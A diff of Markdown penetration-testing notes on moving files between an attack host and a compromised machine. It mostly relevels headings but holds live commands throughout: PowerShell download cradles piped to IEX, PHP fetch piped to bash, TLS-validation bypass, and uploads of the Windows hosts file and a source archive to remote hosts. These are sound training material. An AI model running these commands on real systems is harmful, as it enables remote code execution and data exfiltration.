@@ -2,8 +2,8 @@
 [Harmj0y Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
 
 # Linux File Transfers
-## FTP
-### Simple Python FTP Server
+# FTP
+## Simple Python FTP Server
 - Installation
 ```
 sudo apt install python3-pyftpdlib
@@ -12,7 +12,7 @@ sudo apt install python3-pyftpdlib
 ```
 python3 -m pyftpdlib -p 21 --write
 ```
-### Download
+## Download
 ```
 # Linux
 
@@ -23,12 +23,12 @@ python3 -m pyftpdlib -p 21 --write
 ftp [hostname/IP]
 get [file]
 ```
-### Upload
+## Upload
 ```
 put [file]
 ```
-## HTTP
-### Simple Python HTTP Server
+# HTTP
+## Simple Python HTTP Server
 ```
 # Python3
 python3 -m http.server [port]
@@ -39,7 +39,7 @@ php -S 0.0.0.0:8000
 # Ruby
 ruby -run -ehttpd . -p8000
 ```
-### Download (Linux)
+## Download (Linux)
 ```
 # Just browse to it using a browser
 
@@ -56,7 +56,7 @@ exec 3<>/dev/tcp/<IP>/<port>
 echo -e "Get /<filename> HTTP/1.1\n\n">&3
 cat <&3
 ```
-### Download (Windows)
+## Download (Windows)
 ```
 # Again, use a browser
 
@@ -85,7 +85,7 @@ Bypass:
 ```
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
-### Web Upload
+## Web Upload
 - Server Setup
 ```
 # Create a cert for the server
@@ -99,23 +99,23 @@ curl -X POST <URL> -F 'files=@<path_to_file>' -F 'files=@<path_to_file>' --insec
 # Note multiple files in the same command. --insecure flag needed for self-signed cert
 ```
 
-## Base64 Encode/Decode
-### Linux
+# Base64 Encode/Decode
+## Linux
 ```
 #Base64 Encode
 cat <file> |base64 -w 0;echo
 #Base64 Decode
 echo -n '<encoded data>' | base64 -d > <filename>
 ```
-### Windows
+## Windows
 ```
 #Base64 Encode
 [Convert]::ToBase64String((Get-Content -path "File_to_Encode" -Encoding byte))
 #Base64 Decode
 [IO.File]::WriteAllBytes("Output_File", [Convert]::FromBase64String("Base64_Encoded_Payload"))
 ```
-## SSH
-### Downloads
+# SSH
+## Downloads
 Enable the ssh server
 ```bash
 sudo systemctl enable ssh
@@ -132,28 +132,11 @@ Download via SCP
 ```bash
 scp plaintext@<IP>:/<path>/<filename> .
 ```
-### Upoads
+## Uploads
 ```bash
 scp <local_file> <user>@<IP>:<Desination_path_to_save_the_file>
 ```
-put directly into IEX
-(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
-``` 
-Powershell v3.0 and later can use Invoke-WebRequest(by default is aliased to ```iwr```,```curl```, and ```wget```)
-```powershell
-Invoke-WebRequest <Target File URL> -OutFile <Output_File_Name>
-```
-<ins>**Common Errors with Powershell**</ins>  
-Internet Explorer first-launch configuration not being completed will prevent downloads. To bypass, use ```-UseBasicParsing```
-```Powershell
-Invoke-WebRequest <Target file URL> -UseBasicParsing | IEX
-```
-SSL/TLS secure channel throws an error if the certificate is not trusted.  
-Bypass:
-```powershell
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-```
-## SMB Downloads
+# SMB
 Create a quick SMB server in Linux
 ```bash
 # Simple Share
@@ -172,7 +155,7 @@ CMD Map File share to drive letter with authentication
 ```cmd
 net use n: \\10.10.10.10\share /user:username password
 ```
-## FTP Downloads
+# FTP Downloads
 FTP Setup on linux attack host
 ```bash
 # Install 
@@ -196,7 +179,7 @@ echo GET file.txt >> ftpcommand.txt
 echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
-## PowerShell Web Uploads
+# PowerShell Web Uploads
 PowerShell doesn't have built-in upload functionality, so we'll have to build it or download it.
 
 Linux Upload Server
@@ -222,7 +205,7 @@ Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 # Send a web request with the base64 variable in the body
 # catch the string with netcat on the other end, and base64 decode the body, giving you the original file
 ```
-## SMB Uploads
+# SMB Uploads
 Installing WebDav Server
 ```bash
 # apt
@@ -243,7 +226,7 @@ Uploading files using SMB WebDAV
 ```cmd
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 ```
-## FTP Uploads
+# FTP Uploads
 ```powershell
 (New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
@@ -257,7 +240,7 @@ echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
 # Transferring with Code
-## Python - Download
+# Python - Download
 Python2 Download
 ```bash
 python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<Saved_File_Name")'
@@ -266,7 +249,7 @@ Python3 Download
 ```bash
 python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<Saved_File_Name")'
 ```
-## Python - Upload
+# Python - Upload
 Start UploadServer
 ```bash
 python3 -m uploadserver
@@ -275,7 +258,7 @@ Python upload one-liner
 ```bash
 python3 -c 'import requests;requests.post("<Upload_URL>",files={"files":open("<Local_File_to_Upload","rb")})'
 ```
-## PHP - Download
+# PHP - Download
 PHP Download w/ File_get_contents()
 ```bash
 php -r '$file = file_get_contents("<URL>"); file_put_contents("<Saved_File_Name>",$file);'
@@ -288,15 +271,15 @@ PHP Download and Pipe to Bash
 ```bash
 php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
-## Ruby - Download
+# Ruby - Download
 ```bash
 ruby -e 'require "net/http"; File.write("<Saved_File_Name>", Net::HTTP.get(URI.parse("<URL>")))'
 ```
-## Perl - Download
+# Perl - Download
 ```bash
 perl -e 'use LWP::Simple; getstore("<URL>", "<Saved_File_Name");'
 ```
-## Javascript - Download
+# Javascript - Download
 Create wsget.js
 ```javascript
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
@@ -312,7 +295,7 @@ From CMD or PowerShell
 ```powershell
 cscript.exe /nologo wget.js <URL> <Output_File_Name>
 ```
-## VBScript - Download
+# VBScript - Download
 Create wget.vbs
 ```vbscript
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
@@ -332,7 +315,7 @@ From CMD or PowerShell
 cscript.exe /nologo wget.vbs <URL>  <OutFile>
 ```
 # Misc File Transfer Methods
-## Transfer w/ Netcat
+# Transfer w/ Netcat
 Compromised machine
 ```bash
 # OG Netcat
@@ -362,7 +345,7 @@ Connecting to Netcat using /dev/tcp to Receive the file
 ```bash
 cat < /dev/tcp/<Attack_Host_IP>/<port> > <Outfile>
 ```
-## PowerShell Session File Transfer
+# PowerShell Session File Transfer
 Enabling powershell remoting opns ports 5986/HTTP & 5986/HTTPS
 Must be administrator, Remote Management Users member, or have explicit permissions
 Create a Powershell Session
@@ -374,7 +357,7 @@ Copy-Item -Path <Local_File> -ToSession $Session -Destination <Destination_File_
 # Copy File from computer w/ Session Object
 Copy-Item -Path "<Remote_File_Path\Name>" -Destination <Local_Path> -FromSession $Session
 ```
-## RDP
+# RDP
 Mounting a Linux Folder using rdesktop
 ```bash
 rdesktop <Target_IP> -d <domain> -u <user> -p <password> -r disk:linux='Local_Folder'
